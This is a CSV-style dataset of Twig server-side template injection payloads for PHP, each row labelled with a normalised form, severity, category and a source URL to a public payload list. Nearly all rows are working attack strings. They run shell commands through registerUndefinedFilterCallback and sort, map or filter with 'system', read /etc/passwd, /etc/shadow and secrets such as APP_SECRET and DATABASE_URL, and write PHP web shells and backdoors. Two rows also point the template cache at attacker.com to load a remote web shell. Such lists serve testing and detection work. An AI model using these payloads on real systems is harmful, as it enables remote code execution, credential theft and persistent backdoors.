{{_self.env.registerUndefinedFilterCallback('system')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('passthru')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('shell_exec')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('popen')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.setCache(""/var/www/html"")}}","{{_self.env.setcache(""S"")}}",php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.enableDebug()}},{{_self.env.enabledebug()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.enableAutoReload()}},{{_self.env.enableautoreload()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.disableStrictVariables()}},{{_self.env.disablestrictvariables()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getCache()}},{{_self.env.getcache()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getTags()}},{{_self.env.gettags()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFilters()}},{{_self.env.getfilters()}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunctions()}},{{_self.env.getfunctions()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getTests()}},{{_self.env.gettests()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getGlobals()}},{{_self.env.getglobals()}},php,Twig,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getLoader()}},{{_self.env.getloader()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getCharset()}},{{_self.env.getcharset()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.isDebug()}},{{_self.env.isdebug()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.isAutoReload()}},{{_self.env.isautoreload()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.isStrictVariables()}},{{_self.env.isstrictvariables()}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request}},{{app.request}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server}},{{app.request.server}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server.all}},{{app.request.server.all}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.query}},{{app.request.query}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.query.all}},{{app.request.query.all}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.request}},{{app.request.request}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.cookies}},{{app.request.cookies}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.files}},{{app.request.files}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server.get('APP_SECRET')}},{{app.request.server.get('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server.get('DATABASE_URL')}},{{app.request.server.get('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server.get('SECRET_KEY')}},{{app.request.server.get('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.session}},{{app.session}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.user}},{{app.user}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.environment}},{{app.environment}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.debug}},{{app.debug}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'<?php system($_GET[cmd]); ?>'|file_put_contents('shell.php')}},{{'S'|file_put_contents('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'<?php phpinfo(); ?>'|file_put_contents('info.php')}},{{'S'|file_put_contents('S')}},php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'<?php eval($_POST[cmd]); ?>'|file_put_contents('backdoor.php')}},{{'S'|file_put_contents('S')}},php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('phpinfo()')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('phpinfo();')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{[""id""]|sort(""system"")}}","{{[""S""]|sort(""S"")}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{[""id""]|merge|sort(""system"")}}","{{[""S""]|merge|sort(""S"")}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{{""<?php phpinfo();"":1}|sort(""system"")}}","{{{""S"":N}|sort(""S"")}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{{""<?php system($_GET[x]);"":1}|sort(""file_put_contents"")}}","{{{""S"":N}|sort(""S"")}}",php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{""<?php system($_GET[x]);""|file_put_contents(""shell.php"")}}","{{""S""|file_put_contents(""S"")}}",php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{""<?php phpinfo();""|file_put_contents(""info.php"")}}","{{""S""|file_put_contents(""S"")}}",php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{""<?php eval($_POST[x]);""|file_put_contents(""eval.php"")}}","{{""S""|file_put_contents(""S"")}}",php,Twig,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('cat /etc/passwd')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('proc_open')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('popen')}}{{_self.env.getFilter('id')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('pcntl_exec')}}{{_self.env.getFilter('/bin/bash')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.setCache('ftp://attacker.com:2121')}},{{_self.env.setcache('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.setCache('http://attacker.com/webshell.php')}},{{_self.env.setcache('S')}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.loadTemplate(""/etc/passwd"")}}","{{_self.env.loadtemplate(""S"")}}",php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.compileSource(""/etc/passwd"")}}","{{_self.env.compilesource(""S"")}}",php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['id',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['cat /etc/passwd',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['whoami',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['ls -la',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['uname -a',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['env',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['pwd',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['cat flag.txt',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['ps aux',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['ifconfig',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['netstat -an',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['cat /etc/shadow',0]|sort('system')}}","{{['S',N]|sort('S')}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'system'('id')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'exec'('id')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'passthru'('id')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'shell_exec'('id')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{'popen'('id','r')}}","{{'S'('S','S')}}",php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'file_get_contents'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{'file_put_contents'('shell.php','<?php system($_GET[x]);')}}","{{'S'('S','S')}}",php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'readfile'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'highlight_file'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'show_source'('/etc/passwd')}},{{'S'('S')}},php,Twig,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.displayStart}},{{_self.displaystart}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.blocks}},{{_self.blocks}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.macros}},{{_self.macros}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.traits}},{{_self.traits}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.parent}},{{_self.parent}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.sourceContext}},{{_self.sourcecontext}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.sourceName}},{{_self.sourcename}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.sourcePath}},{{_self.sourcepath}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{dump(_self)}},{{dump(_self)}},php,Twig,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{dump(_self.env)}},{{dump(_self.env)}},php,Twig,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat${IFS}/etc/passwd']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat${IFS}/etc/passwd']|map('system')}},{{['S']|map('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat</etc/passwd']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat<flag.txt']|map('system')}},{{['S']|map('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'cat /etc/passwd'|split(' ')|join('|')|map('system')}},{{'S'|split('S')|join('S')|map('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('system(""id"")')}}",{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('system(""id"");')}}",{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('call_user_func')}}{{_self.env.getFilter('system"",""id')}}",{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('call_user_func_array')}}{{_self.env.getFilter('system',array(""id""))}}","{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S',array(""S""))}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('array_map')}}{{_self.env.getFilter('system',array(""id""))}}","{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S',array(""S""))}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.registerUndefinedFilterCallback('array_filter')}}{{_self.env.getFilter('system',array(""id""))}}","{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S',array(""S""))}}",php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('usort')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('uasort')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('uksort')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('array_reduce')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('array_walk')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('array_walk_recursive')}}{{_self.env.getFilter('system')}},{{_self.env.registerundefinedfiltercallback('S')}}{{_self.env.getfilter('S')}},php,Twig,1,high,feature-abuse,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
